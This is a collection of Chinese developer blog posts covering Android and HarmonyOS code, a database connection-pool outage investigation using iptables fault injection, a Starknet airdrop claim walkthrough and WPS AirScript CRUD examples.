可是，即使我可以容忍抄袭，作为一个博主，我认为我有义务打击抄袭行为，维护互联网环境，匹夫有责。就好比十几年前，偷东西还没什么成本，坐趟火车手机、钱包啥都没了，现在满大街都是摄像头，就很少再出现偷东西的贼了。 想了解下各位博主们是怎么解决这个问题的。 比如：复制时自动添加版权声明？复制时弹窗？或者干脆禁止复制？都是防君子不防小人的做法，防不了抄袭者，反而给正常读者带来了不便，所以我觉得没有必要。 比如：依托维权平台？个人博客本身并不能获利，为此付费维权实在有点舍不得。","link":"/2024/about-plagiarism/"},{"title":"Android 14 APP 全屏代码实现","text":"新的 Android API 改变了应用全屏的方式，网上搜到的全屏代码都不管用了，甚至 谷歌自己的教程 都没有更新，看了 API 文档才研究明白最新代码怎么写。本篇讲述两种新的全屏方式，一种保留状态栏文字的全屏，一种隐藏状态栏的全屏。 保留状态栏，适配全面屏默认情况下，应用界面不会延伸到系统状态栏、导航栏、导航条等区域，这会很丑，要想适配全面屏显示，在 Android 14 中，可以用一行代码简单实现。 123// import androidx.activity.enableEdgeToEdgenableEdgeToEdge() 隐藏状态栏，完全全屏适配全面屏并不会隐藏系统状态栏、导航栏、导航条，如果想实现完全全屏，老办法一般是调用 setSystemUiVisibility()，然而这个方法在 14 中已经弃用了，获取 InsetsController 的 ViewCompat.getWindowInsetsController() 方法也被弃用了，最新的写法是： 123456789// import androidx.core.view.WindowCompat// import androidx.core.view.WindowInsetsCompat// import androidx.core.view.WindowInsetsControllerCompatval windowController = WindowCompat.getInsetsController(window, window.decorView)// 应用全屏时，用户仍然可以从屏幕顶部下拉唤出状态栏，此行代码实现当用户唤出状态栏后，自动隐藏状态栏windowController.systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE// 隐藏包括状态栏、导航栏、caption bar 在内的所有系统栏windowController.hide(WindowInsetsCompat.Type.systemBars())","link":"/2024/android-fullscreen/"},{"title":"离奇问题，网络故障恢复后，无法重连到数据库？","text":"问题现象周末生产环境出现了一个奇怪的问题，部署在 k8s 容器中的 SpringBoot 应用连接到数据库的交换机出现了故障，交换机的故障恢复后，查询数据库的接口还是无法提供服务，试了很多次，日志中报出的异常依然是 Connection is not available，难道是网络还是没回复？ 网络可能不通？那我们就 telnet 一下，网络是没问题的。最后我们使用 netstat 看一下和数据库的连接状态，状态是 ‌ESTABLISHED，这个状态表示已经成功建立连接，但是连接只有一个，与我们配置的最小活跃连接数 10 的数量不相符，此时为了业务能尽快恢复，只好重启了应用服务。 事后，我们又查看了所有通过这个故障交换机连接数据库的应用，有的没有发生问题，有的没有经过重启，分别在 20 分钟和 120 分钟之后自动恢复了，于是我们开始在测试环境想办法复现这个问题并寻找解决方案。 问题复现经过梳理，我们发现 20 分钟恢复的应用都部署在虚拟机上，120 分钟恢复的应用都部署在容器上，根据这两个数字，于是很快联想到 tcp_keepalive_time 这个系统配置，我们查看了虚机和容器的这个参数配置： 1sysctl net.ipv4.tcp_keepalive_time 结果是，虚机是 1200，容器是 7200，换算一下，刚好是 20 分钟和 120 分钟，于是我们猜测，这个状态是 ESTABLISHED 的连接其实就是不可用的，即使连上了，我们也无法向数据库发送报文。 随后我们着手复现这个现象，并在测试环境的交换机中通过手动断开与数据库的连接来模拟故障，但是每次的试验结果都是，在故障恢复以后，应用和数据库的 TCP 连接立马恢复到 10 个，也就是最小活跃连接数，生产问题根本无法复现。 接下来，我们把目光投向 JDBC 建立数据库连接的过程，SpringBoot 的数据库连接池，毫无例外的都是使用 JDBC 连接数据库的，建立连接就要调用 getConnection()方法。这个方法，首先会建立 TCP 连接，TCP 建立连接后，连接就会保持在 ESTABLISHED 状态，然后发送认证信息，有没有可能问题就出在认证过程？如何模拟这种情况，我们用到了 iptables 这个工具。 iptables 是 Linux 操作系统中的一个用户空间工具，用于配置 Linux 内核中的 iptables 防火墙。它允许系统管理员定义规则来控制网络流量的进出、转发以及网络地址转换 (NAT)。iptables 通常用于安全性设置、防止未经授权的访问、管理网络流量等。我们回顾一下 TCP 三次握手的流程： 我们利用 iptables 屏蔽除 TCP 以外的三次握手，就能够达到目的了： 1234iptables -A OUTPUT -p tcp --dport 2883 --tcp-flags SYN SYN -j ACCEPTiptables -A INPUT -p tcp --sport 2883 --tcp-flags SYN,ACK SYN,ACK -j ACCEPTiptables -A OUTPUT -p tcp --dport 2883 --tcp-flags ACK ACK -j ACCEPTiptables -A INPUT -p tcp --sport 2883 --tcp-flags ACK ACK -j DROP 这四个命令，大致意思就是允许客户端和服务端（端口为 2883）标志位为(SYN)、（SYN,ACK）的通讯包，分别对应 TCP 握手的前两次握手。允许客户端发送向服务端发送标志位（ACK）的通讯包，对应 TCP 握手的第三次握手。丢弃所有来自端口 2883 的标志位为（ ACK）的通讯包，这样我们就达到了允许 TCP 成功握手，但是认证报文无法收到响应的问题。 通过这个方式注入故障，生产的问题终于复现了！注入这个故障后，和数据库的 TCP 连接逐渐降低到 1 个，且状态是 ESTABLISHED，随后我们移除故障，应用仍然没有恢复，经过了 tcp_keepalive_time 后，和数据库的连接数恢复到最小活跃连接数，问题就此复现。 最后一个问题为什么故障恢复后，连接池不会恢复，我们翻看了 HikariCP 连接池的源码后发现，填充连接的线程，是一个单线程： 123456789private synchronized void fillPool() { final int connectionsToAdd = Math.min(config.getMaximumPoolSize() - getTotalConnections(), config.getMinimumIdle() - getIdleConnections()) - addConnectionQueueReadOnlyView.size(); if (connectionsToAdd &lt;= 0) logger.debug(&quot;{} - Fill pool skipped, pool is at sufficient level.&quot;, poolName); // addConnectionExecutor 线程池里核心线程数和最大线程数都是 1 for (int i = 0; i &lt; connectionsToAdd; i++) { addConnectionExecutor.submit((i &lt; connectionsToAdd - 1) ? poolEntryCreator : postFillPoolEntryCreator); }} 复现过程中，我们通过 jstack 查看应用堆栈信息，该线程卡在 getConnection()，处于 socketRead 状态，这样就再也不会有新的连接建立了，应用不会恢复的问题也找到了！后来我们测试了 Druid 连接池，也存在这个问题，由于我们用的是 HikariCP，Druid 的源码我们就没有研究了。 解决方案首先，我们要改 HikariCP 的源码的，简单的把 addConnectionExecutor 的线程数调大？当然不行，故障时间长了，问题还是会出现。 我们找到了这个任务里真正建立连接的代码，把他交给一个线程去处理，并配置了超时时间，超过这个时间，就强制销毁这个线程，这样 addConnectionExecutor 就不会阻塞了。在 PoolBase 里的 newConnection 方法里 1234567891011// doConnectionExecutor 是新定义的线程池，核心线程数和最大线程数都是 1Future&lt;Connection&gt; connectionFuture = this.doConnectionExecutor.submit(this.newConnectionTask);try { // get 设置超时时间 connection = connectionFuture.get(this.config.getConnectionTimeout(), MILLISECONDS);} catch (TimeoutException e) { // 取消任务 connectionFuture.cancel(true); // 销毁并重置线程，其实就是调用 shutdownNow() 然后重建线程池 this.handleRecoveryThread();} 这样看似会不断重建线程，影响性能，实际上，只要不出现故障，就没有影响，线程数还是 1，出现故障，这点性能也就无所谓了。这样改，addConnectionExecutor 就不会阻塞了。 这样有一个风险，如果 tcp_keepalive_time 过长且故障一直不恢复，会建立很多无用的连接，连接数会一直膨胀，把服务器端口占满。如果 tcp_keepalive_time 合适的话，这些无用连接都会被关闭，最终在 tcp_keepalive_time 窗口期内维持一个定值，问题也不会太大。 最后，k8s 的 tcp_keepalive_time 不会继承宿主机的这个配置，默认是 7200 秒，如果没有高权限，比如我们的生产环境，是没办法在 Dockerfile 里改的，这个时候需要用到 initContainers，在 deployment 的 yaml 文件中添加如下配置： 123456789initContainers: - name: sysctl-set image: centos:7 command: - sh - &quot;-c&quot; - sysctl -w net.ipv4.tcp_keepalive_time=1200 securityContext: privileged: true 至此，这个问题基本上解决了！ 本文作者: twl由 iMaeGoo 代为发表","link":"/2024/conn-pool-pro-issue/"},{"title":"符合条件的 GitHub 开源项目贡献者可获取 Stark 空投","text":"重要提醒放在最前面：最近如果有人有偿借用你的 GitHub 账号，请不要相信。 前天 Tianli 提醒我，Starknet 正在向给 Github 按 star 排前 5000 个 repo 贡献过代码的人发钱，可以领领看。仔细研究了一下，最终我也拿到了这笔意外之财。 下面分享一下过程。 首先看一下领取条件 在 2023 年 11 月 15 日之前，您至少向全球星数排名前 5,000 位的版本库提交了三次内容。其中至少一次提交发生在 2018 年或之后。 即使不符合条件也先不要气馁，可以试着查一下资格，因为这 5000 个仓库的范围比较迷，我甚至都不记得自己是给哪个仓库贡献达标的…… 打开 provisions.starknet.io，点击 Eligibility check only，选择 GitHub，输入 GitHub 用户名，点击 Go，如果提示 Congratulations，那你就可以领到这笔钱了。 接着点击 Disconnect，点 Claim STRK，按步骤下载浏览器插件（选哪个都可以，我选择的是 Argent X），创建一个钱包地址，在核验资格的步骤选择最后一个 GitHub，授权 GitHub 账号，然后这笔钱就到自己的钱包里了，不知道各位都领了多少，我领到了 111.1。大约 1~2 分钟检查钱包到账情况。 接下来提现到支付宝。由于我国的加密货币政策原因，提现一定要选择安全正规的大平台进行，提现的大致过程如下 提醒！此教程仅提供大致的加密货币提现方法，用于国内优秀开源贡献者兑换奖金。参与加密货币交易违反国内政策，投资须谨慎，加密货币风险高，请不要参与炒币，场外交易有刑事风险！ 申请交易所账号：我用的是 欧易（该链接是我的邀请链接，如果你不希望通过邀请码注册，可以直接搜索欧易） 下载 APP 进行实名认证：有实名认证的交易所能更大程度确保资金来源安全 充币：币种选择 STRK，充至交易账户，打开钱包按步骤将币转入欧易提供的地址内，等待 5~10 分钟到账 卖出 STRK 获得 USDT：前往 STRK/USDT 的交易页面选择卖出，挂单，选市价委托（设置一个合理的限价也可以），数量 100%，等成交 提币：卖完到资产页面，把 USDT 余额从交易账户转到资金账户，点提币，C2C 交易，支付方式推荐选支付宝，选一个成交量比较高的靠谱的买家，填写支付宝账户并上传支付宝收款码，将 USDT 全部出售，1~20 分钟后即可到账，确认到账金额、付款方姓名正确后，回到交易所页面确认收款，交易完成 最后再次提醒！此教程仅提供大致的加密货币提现方法，用于国内优秀开源贡献者兑换奖金。参与加密货币交易违反国内政策，投资须谨慎，加密货币风险高，请不要参与炒币，场外交易有刑事风险！ 感谢那些一直默默付出的贡献者们，这次空投给开源社区打了一剂振奋剂，也引来了不少别出心裁之人…… 还有一些开源项目表示自己收到了许多垃圾 PR，或许是一些人希望借此抢下一次的空投。","link":"/2024/get-stark-provisions/"},{"title":"Harmony 鸿蒙应用开发之解决 Web 组件加载本地资源跨域问题","text":"鸿蒙开发文档中有一节 加载本地页面 提到了可以通过 $rawfile 方法加载本地 HTML 网页： Index.ets1Web({ src: $rawfile(&quot;local.html&quot;), controller: this.webviewController }) 但是如果在 local.html 中需要引用一些静态资源，例如图片、JS、CSS 等，静态资源放在 local.html 同级目录下，会出现跨域的错误： Console1Access to ... at 'resource://...' from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, arkweb, data, chrome-extension, chrome, https, chrome-untrusted. 这是因为本地资源的 URL 是以 resource:// 开头的，Web 组件没有这种类型 URL 的跨域处理策略。 怎样解决跨域问题？我想到了一种通过 onInterceptRequest 拦截请求解决跨域的方法，在此分享，该方法 不一定是最佳实践，但确实能够解决跨域。 解决加载本地资源的跨域问题Index.ets12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import url from '@ohos.url';import web_webview from '@ohos.web.webview';@Entry@Componentstruct Index { webviewController: web_webview.WebviewController = new web_webview.WebviewController(); responseResource: WebResourceResponse = new WebResourceResponse(); localMockUrl: string = 'http://myapp.local'; aboutToAppear() { // 配置Web开启调试模式 web_webview.WebviewController.setWebDebuggingAccess(true); } build() { Column() { Web({ // TODO: 把 local.html 修改为你自己的 html 文件路径 src: `${this.localMockUrl}/local.html`, controller: this.webviewController }) .onInterceptRequest((event) =&gt; { if (event) { // 拦截页面请求 const requestUrl = event.request.getRequestUrl() if (requestUrl.startsWith(this.localMockUrl)) { // 获取相对路径 const relativePath = url.URL.parseURL(requestUrl).pathname.replace(/^\\//, ''); const resource = $rawfile(relativePath); this.responseResource.setResponseData(resource); this.responseResource.setResponseEncoding('utf-8'); let mimeType = &quot;text/plain&quot;; if (relativePath.endsWith(&quot;.html&quot;)) { mimeType = &quot;text/html&quot;; } else if (relativePath.endsWith(&quot;.css&quot;)) { mimeType = &quot;text/css&quot;; } else if (relativePath.endsWith(&quot;.js&quot;)) { mimeType = &quot;text/javascript&quot;; } else if (relativePath.endsWith(&quot;.png&quot;)) { mimeType = &quot;image/png&quot;; } else if (relativePath.endsWith(&quot;.gif&quot;)) { mimeType = &quot;image/gif&quot;; } else if (relativePath.endsWith(&quot;.svg&quot;)) { mimeType = &quot;image/svg+xml&quot;; } else if (relativePath.endsWith(&quot;.pdf&quot;)) { mimeType = &quot;application/pdf&quot;; } else { // TODO: 把你网页用到的所有静态资源的 mimeType 补充到上面这段逻辑中 } this.responseResource.setResponseMimeType(mimeType); this.responseResource.setResponseCode(200); this.responseResource.setReasonMessage('OK'); return this.responseResource; } } return null; }) } }} 解决加载网络资源的跨域问题如果跨域是因为 H5 需要向服务器请求获取数据，不是加载本地资源文件导致的，可以把上面代码中的 localMockUrl 改成和服务器相同的 origin（例如 http://api.xxx.com，结尾不要带 /），实现本地资源和服务器资源同域，并在 onInterceptRequest 中补充下面的判断： 12345// 把这个判断改成你实际判断服务端请求的方式if (relativePath.startsWith(&quot;api/&quot;)) { // 如果路径以 api/ 开头，代表这是一个服务器请求，返回 null 代表不拦截 return null;} 效果： 还不明白的可以拉这个仓库自己试验: https://gitee.com/imaegoo/hm-cors-demo 代码在 entry/src/main/ets/pages/Index.ets 和 entry/src/main/resources/rawfile/local.html 里","link":"/2024/harmony-arkweb-cors/"},{"title":"HarmonyOS NEXT 应用开发踩坑笔记","text":"What’s HarmonyOS NEXT鸿蒙系统将移除 AOSP（Android 开源项目），不再兼容 apk 格式的安卓应用的安装。 比较 Harmony 与 Android 系统 Harmony Android 语言 ArkTS Java IDE DevEco Studio Android Studio 安装包格式 APP APK API 版本API 9 对应兼容安卓的鸿蒙，API 10 和 API 11 对应鸿蒙 NEXT。 开发套件申请鸿蒙 NEXT 的开发套件目前是内测状态，不过个人开发者也可以申请，申请地址是: https://developer.harmonyos.com/deveco-developer-suite/enabling/kit?currentPage=1&amp;pageSize=100 鸿蒙 NEXT 的文档地址: https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V2/environment_config-0000001052902427-V2 个人申请到开发套件后，鸿蒙 NEXT 的文档仍然没法看，想看文档需要企业开发者账号。只能先看着 API 9 的文档。 不想申请也没关系，可以先用已经成熟的 API 9 开发自己的 APP，待到 API 10 发布之后，再升级。应用模型推荐用 Stage 模型，FA 模型正在逐渐被淘汰。 环境搭建需要预先装好 Node.js 16（NEXT 是 18），最好不要同时装好几个版本的 Node.js，也不要同时装正式版的 IDE 和内测版的 IDE，否则 Hvigor（构建工具）会出现奇妙的问题…… 没有华为手机可以用模拟器开发。但模拟器有不少坑，诸如卡顿、文件管理器调不起来、WebView 无法滚动等。如果真心想钻研鸿蒙开发，建议买台华为手机。 不想一个 APP 写三套代码许多人比较关心，一个 APP，我 iOS 用 Swift 开发一遍，Android 用 Java 开发一遍，鸿蒙还要再用 ArkTS 再开发一遍？将来万一再出个小米澎湃 OS 应用…… 对此鸿蒙的技术人员表示，以后也会支持 React Native 和 Flutter 跨平台开发框架打包成鸿蒙应用，用这类框架的应用，鸿蒙化改造成本会很低。 鸿蒙 NEXT 发布计划1 月 18 日发公测。大概秋季正式版。 鸿蒙 NEXT 最早推送的机型有 nova 12、mate 60、mate x5，模拟器会先适配 mac arm。 据说正式版会保留一个沙箱用以运行安卓应用，和鸿蒙系统隔离开来，不知道真的假的。","link":"/2024/harmony-next/"},{"title":"Harmony 鸿蒙应用开发之展示 PDF 文件","text":"鸿蒙应用展示 PDF 文件有三种方式 通过 ArkWeb 先加载 PDF.js，再用 PDF.js 加载 PDF 文件 通过 ArkWeb 直接加载 PDF 文件 原生加载 第一种方式比较复杂，涉及到 PDF.js 资源的加载、跨域的处理等，我就直接放代码仓库，读者可以自行研究: https://gitee.com/imaegoo/hm-pdf-viewer 更加推荐第二种方式，写法更简单 Index.ets12345678910111213141516171819202122232425import web_webview from '@ohos.web.webview';@Entry@Componentstruct Index { webviewController: web_webview.WebviewController = new web_webview.WebviewController(); aboutToAppear() { // 配置 Web 开启调试模式，生产打包时要删掉 web_webview.WebviewController.setWebDebuggingAccess(true); } build() { Column() { Web({ // 把要展示的文件放到 entry/src/main/resources/rawfile/test.pdf src: $rawfile('test.pdf'), // 或者传网址 src: 'https://mozilla.github.io/pdf.js/web/compressed.tracemonkey-pldi-09.pdf', controller: this.webviewController }) // 这行是关键，不加这行只能看到灰色的页面 .domStorageAccess(true) } }} 第三种方式需要写 C++，暂时没找到现成的类库，所以没有走这条路 声明 本文首发于虹墨空间站，转载于华为开发者联盟。以下相似文章是本文的 未署名演绎 版本，未经过本人授权，违反了 CC BY 4.0 协议。在此谴责未署名的抄袭行为，谴责在文中插入培训机构广告的行为。 https://blog.csdn.net/weixin_61845324/article/details/136888565 by 码中之牛 https://www.jianshu.com/p/0a32499bcfa5 by 迪士尼在逃程序员 由于华为开发者联盟发布的文章频繁遭到培训机构的抄袭，本站文章未来将不再转载至华为开发者联盟。","link":"/2024/harmony-pdf-viewer/"},{"title":"使用 HTTP API 从 WPS 在线表格中增删改查数据示例","text":"在 使用 HTTP API 从 WPS 在线表格中获取数据 中，我介绍了如何查询数据，本篇将介绍如何利用 AirScript 实现完整的增删改查。 首先还是在金山文档中创建一个智能表格，在智能表格中创建一个数据表，这里以 “汇率表” 为例。 点 “高级功能” - “高级开发” - “AirScript 脚本编辑器”，在文档共享脚本中，点击 + 号右边的下拉按钮，创建一个 AirScript 1.0 脚本。 AirScript 2.0 脚本暂时还不支持数据表 输入以下代码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115/** * WPS 智能表格数据表 AirScript 增删改查示例 * @author iMaeGoo &lt;hello@imaegoo.com&gt; * @copyright iMaeGoo 2024 * @license MIT */// 请求参数const request = { // 操作 (&quot;create&quot; | &quot;read&quot; | &quot;update&quot; | &quot;delete&quot;) action: Context.argv.action, // 数据表名 sheet: Context.argv.sheet, // 筛选条件，写法参考 https://airsheet.wps.cn/docs/api/excel/databook/%E9%99%84%E5%BD%95.html#%E9%99%84%E5%BD%95-3-%E7%AD%9B%E9%80%89%E6%9D%A1%E4%BB%B6%E8%AF%B4%E6%98%8E filter: Context.argv.filter, // 更新的字段信息 fields: Context.argv.fields,};// 响应参数const response = { success: false, data: undefined, message: &quot;&quot;,};if (!request.action) { response.message = &quot;action 参数不能为空&quot;; return response;}if (!request.sheet) { response.message = &quot;sheet 参数不能为空&quot;; return response;}// 获取工作表const sheet = Application.Sheets.Item(request.sheet);switch (request.action) { case &quot;create&quot;: response.data = create(); response.success = true; response.message = &quot;创建成功&quot;; break; case &quot;read&quot;: response.data = read(); response.success = true; response.message = &quot;查询成功&quot;; break; case &quot;update&quot;: response.data = update(); response.success = true; response.message = &quot;更新成功&quot;; break; case &quot;delete&quot;: response.data = del(); response.success = true; response.message = &quot;删除成功&quot;; break; default: response.message = 'action 参数错误，应为 &quot;create&quot; | &quot;read&quot; | &quot;update&quot; | &quot;delete&quot;';}// 增function create() { return sheet.Record.CreateRecords({ Records: [ { fields: request.fields, }, ], });}// 查function read() { let all = []; let offset = null; while (all.length === 0 || offset) { let records = sheet.Record.GetRecords({ Offset: offset, Filter: request.filter, }); offset = records.offset; all = all.concat(records.records); } return all;}// 改function update() { const records = read(); const updateRecords = records.map((record) =&gt; { return { id: record.id, fields: request.fields, }; }); return sheet.Record.UpdateRecords({ Records: updateRecords, });}// 删function del() { const records = read(); const deleteIds = records.map((record) =&gt; record.id); return sheet.Record.DeleteRecords({ RecordIds: deleteIds, });}return response; 按 Ctrl + S 保存脚本，然后点击工具栏上的 “脚本令牌” 按钮，生成一个脚本令牌，复制这个令牌保存（以后将无法再次查看），令牌有效期是半年，但放心，令牌可以随时延期，延期后令牌不变。 点击脚本名称旁边的菜单，点击 “复制脚本 webhook” 并保存。 接下来只需 POST 这个 webhook 地址，在请求头中带上 AirScript-Token: 脚本令牌，即可实现增删改查功能。 查询查询美元的汇率 请求参数1234567891011121314151617181920{ &quot;Context&quot;: { &quot;argv&quot;: { &quot;action&quot;: &quot;read&quot;, &quot;sheet&quot;: &quot;汇率表&quot;, &quot;filter&quot;: { &quot;mode&quot;: &quot;AND&quot;, &quot;criteria&quot;: [ { &quot;field&quot;: &quot;货币名称&quot;, &quot;op&quot;: &quot;Contains&quot;, &quot;values&quot;: [ &quot;美元&quot; ] } ] } } }} 响应参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354{ &quot;data&quot;: { &quot;logs&quot;: [ { &quot;filename&quot;: &quot;&lt;system&gt;&quot;, &quot;timestamp&quot;: &quot;15:42:07.539&quot;, &quot;unix_time&quot;: 1725867727539, &quot;level&quot;: &quot;info&quot;, &quot;args&quot;: [ &quot;脚本环境(1.0)初始化...&quot; ] }, { &quot;filename&quot;: &quot;&lt;system&gt;&quot;, &quot;timestamp&quot;: &quot;15:42:07.544&quot;, &quot;unix_time&quot;: 1725867727544, &quot;level&quot;: &quot;info&quot;, &quot;args&quot;: [ &quot;已开始执行&quot; ] }, { &quot;filename&quot;: &quot;&lt;system&gt;&quot;, &quot;timestamp&quot;: &quot;15:42:07.678&quot;, &quot;unix_time&quot;: 1725867727678, &quot;level&quot;: &quot;info&quot;, &quot;args&quot;: [ &quot;执行完毕&quot; ] } ], &quot;result&quot;: { &quot;data&quot;: [ { &quot;fields&quot;: { &quot;中行折算价&quot;: 709.89, &quot;发布日期&quot;: &quot;2024/09/09&quot;, &quot;发布时间&quot;: &quot;15:25:28&quot;, &quot;现汇买入价&quot;: 710.11, &quot;现汇卖出价&quot;: 712.94, &quot;现钞买入价&quot;: 704.34, &quot;现钞卖出价&quot;: 712.94, &quot;货币名称&quot;: &quot;美元&quot; }, &quot;id&quot;: &quot;VN&quot; } ], &quot;message&quot;: &quot;查询成功&quot;, &quot;success&quot;: true } }, &quot;error&quot;: &quot;&quot;, &quot;status&quot;: &quot;finished&quot;} 新增创建一条 “萌币” 的汇率记录 请求参数12345678910111213141516171819{ &quot;Context&quot;: { &quot;argv&quot;: { &quot;action&quot;: &quot;create&quot;, &quot;sheet&quot;: &quot;汇率表&quot;, &quot;filter&quot;: {}, &quot;fields&quot;: { &quot;中行折算价&quot;: 26.05, &quot;发布日期&quot;: &quot;2024/09/09&quot;, &quot;发布时间&quot;: &quot;15:55:28&quot;, &quot;现汇买入价&quot;: 21.05, &quot;现汇卖出价&quot;: 22.05, &quot;现钞买入价&quot;: 23.05, &quot;现钞卖出价&quot;: 25.95, &quot;货币名称&quot;: &quot;萌币&quot; } } }} 响应参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354{ &quot;data&quot;: { &quot;logs&quot;: [ { &quot;filename&quot;: &quot;&lt;system&gt;&quot;, &quot;timestamp&quot;: &quot;15:56:57.857&quot;, &quot;unix_time&quot;: 1725868617857, &quot;level&quot;: &quot;info&quot;, &quot;args&quot;: [ &quot;脚本环境(1.0)初始化...&quot; ] }, { &quot;filename&quot;: &quot;&lt;system&gt;&quot;, &quot;timestamp&quot;: &quot;15:56:58.650&quot;, &quot;unix_time&quot;: 1725868618650, &quot;level&quot;: &quot;info&quot;, &quot;args&quot;: [ &quot;已开始执行&quot; ] }, { &quot;filename&quot;: &quot;&lt;system&gt;&quot;, &quot;timestamp&quot;: &quot;15:56:58.805&quot;, &quot;unix_time&quot;: 1725868618805, &quot;level&quot;: &quot;info&quot;, &quot;args&quot;: [ &quot;执行完毕&quot; ] } ], &quot;result&quot;: { &quot;data&quot;: [ { &quot;fields&quot;: { &quot;中行折算价&quot;: 26.05, &quot;发布日期&quot;: &quot;2024/09/09&quot;, &quot;发布时间&quot;: &quot;15:55:28&quot;, &quot;现汇买入价&quot;: 21.05, &quot;现汇卖出价&quot;: 22.05, &quot;现钞买入价&quot;: 23.05, &quot;现钞卖出价&quot;: 25.95, &quot;货币名称&quot;: &quot;萌币&quot; }, &quot;id&quot;: &quot;VP&quot; } ], &quot;message&quot;: &quot;创建成功&quot;, &quot;success&quot;: true } }, &quot;error&quot;: &quot;&quot;, &quot;status&quot;: &quot;finished&quot;} 修改修改 “萌币” 的备注 请求参数1234567891011121314151617181920212223{ &quot;Context&quot;: { &quot;argv&quot;: { &quot;action&quot;: &quot;update&quot;, &quot;sheet&quot;: &quot;汇率表&quot;, &quot;filter&quot;: { &quot;mode&quot;: &quot;AND&quot;, &quot;criteria&quot;: [ { &quot;field&quot;: &quot;货币名称&quot;, &quot;op&quot;: &quot;Contains&quot;, &quot;values&quot;: [ &quot;萌币&quot; ] } ] }, &quot;fields&quot;: { &quot;备注&quot;: &quot;很萌但并不存在的货币&quot; } } }} 响应参数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455{ &quot;data&quot;: { &quot;logs&quot;: [ { &quot;filename&quot;: &quot;&lt;system&gt;&quot;, &quot;timestamp&quot;: &quot;16:00:41.894&quot;, &quot;unix_time&quot;: 1725868841894, &quot;level&quot;: &quot;info&quot;, &quot;args&quot;: [ &quot;脚本环境(1.0)初始化...&quot; ] }, { &quot;filename&quot;: &quot;&lt;system&gt;&quot;, &quot;timestamp&quot;: &quot;16:00:42.683&quot;, &quot;unix_time&quot;: 1725868842683, &quot;level&quot;: &quot;info&quot;, &quot;args&quot;: [ &quot;已开始执行&quot; ] }, { &quot;filename&quot;: &quot;&lt;system&gt;&quot;, &quot;timestamp&quot;: &quot;16:00:42.955&quot;, &quot;unix_time&quot;: 1725868842955, &quot;level&quot;: &quot;info&quot;, &quot;args&quot;: [ &quot;执行完毕&quot; ] } ], &quot;result&quot;: { &quot;data&quot;: [ { &quot;fields&quot;: { &quot;中行折算价&quot;: 26.05, &quot;发布日期&quot;: &quot;2024/09/09&quot;, &quot;发布时间&quot;: &quot;15:55:28&quot;, &quot;备注&quot;: &quot;很萌但并不存在的货币&quot;, &quot;现汇买入价&quot;: 21.05, &quot;现汇卖出价&quot;: 22.05, &quot;现钞买入价&quot;: 23.05, &quot;现钞卖出价&quot;: 25.95, &quot;货币名称&quot;: &quot;萌币&quot; }, &quot;id&quot;: &quot;VP&quot; } ], &quot;message&quot;: &quot;更新成功&quot;, &quot;success&quot;: true } }, &quot;error&quot;: &quot;&quot;, &quot;status&quot;: &quot;finished&quot;} 删除删除 “萌币” 记录 请求参数1234567891011121314151617181920{ &quot;Context&quot;: { &quot;argv&quot;: { &quot;action&quot;: &quot;delete&quot;, &quot;sheet&quot;: &quot;汇率表&quot;, &quot;filter&quot;: { &quot;mode&quot;: &quot;AND&quot;, &quot;criteria&quot;: [ { &quot;field&quot;: &quot;货币名称&quot;, &quot;op&quot;: &quot;Contains&quot;, &quot;values&quot;: [ &quot;萌币&quot; ] } ] } } }} 响应参数123456789101112131415161718192021222324252627282930313233343536373839404142434445{ &quot;data&quot;: { &quot;logs&quot;: [ { &quot;filename&quot;: &quot;&lt;system&gt;&quot;, &quot;timestamp&quot;: &quot;16:01:47.265&quot;, &quot;unix_time&quot;: 1725868907265, &quot;level&quot;: &quot;info&quot;, &quot;args&quot;: [ &quot;脚本环境(1.0)初始化...&quot; ] }, { &quot;filename&quot;: &quot;&lt;system&gt;&quot;, &quot;timestamp&quot;: &quot;16:01:47.271&quot;, &quot;unix_time&quot;: 1725868907271, &quot;level&quot;: &quot;info&quot;, &quot;args&quot;: [ &quot;已开始执行&quot; ] }, { &quot;filename&quot;: &quot;&lt;system&gt;&quot;, &quot;timestamp&quot;: &quot;16:01:47.526&quot;, &quot;unix_time&quot;: 1725868907526, &quot;level&quot;: &quot;info&quot;, &quot;args&quot;: [ &quot;执行完毕&quot; ] } ], &quot;result&quot;: { &quot;data&quot;: [ { &quot;deleted&quot;: true, &quot;id&quot;: &quot;VP&quot; } ], &quot;message&quot;: &quot;删除成功&quot;, &quot;success&quot;: true } }, &quot;error&quot;: &quot;&quot;, &quot;status&quot;: &quot;finished&quot;}","link":"/2024/http-crud-data-from-wps/"},{"title":"使用 HTTP API 从 WPS 在线表格中获取数据","text":"之前的博文中，我提到过本站的友情链接是通过 Vika 维格表管理的，维格表的一大特色是支持通过 API 增、删、改、查表格中的数据，这直接让维格表化身为一个简单的数据库，可玩性大大提升，通过它维护友链数据，并通过自己编写的脚本生成友链页面就是个例子。 然而最近我放弃了维格表，改用 WPS 在线表格，原因有四点： Vika 页面经常有奇奇怪怪的 bug，比如拖拽改变数据顺序时，数据会乱跑； 性能优化不行，在我仍在服役的那台十年前的笔记本上，用 WPS 还行，用 Vika 一定会卡； 每次打开都有一个开通会员的流氓弹窗，这个弹窗的 × 号是个假的，第一次点击会跳转到开通会员的页面，第二次点击才会关闭弹窗，怪难受的； 关于第三点的流氓弹窗，悄悄告诉你一个解决办法—— 12// 打开 F12 - Console，执行localStorage.setItem(&quot;LAST_PAYMENT_REMINDER_TIME&quot;, &quot;9999999999999&quot;); Vika 免费空间只支持 20,000 行数据、上传 30 个文件，我已经用了 50% 了，该给数据寻找新家了。 将 Vika 的所有数据迁移至 WPS 在线表格后，最大的问题就是该如何通过 API 查询数据。Vika 中有方便的 @vikadata/vika SDK，WPS 其实也有方便的 HTTP 接口，通过查阅 金山文档开放平台，我发现在线表格可以通过遍历记录接口获取数据，然而事情真的有这么简单吗？ 问题一：想要调用金山文档开放平台的接口，需要认证成为 WPS 开发者，认证需要营业执照，且 不支持个人认证，这不是为难我这个不准开公司的银行小打工人吗？ 问题二：即使认证成功，调用接口也需要 access token，一个 token 的有效期仅有一天，刷新 token 需要手动 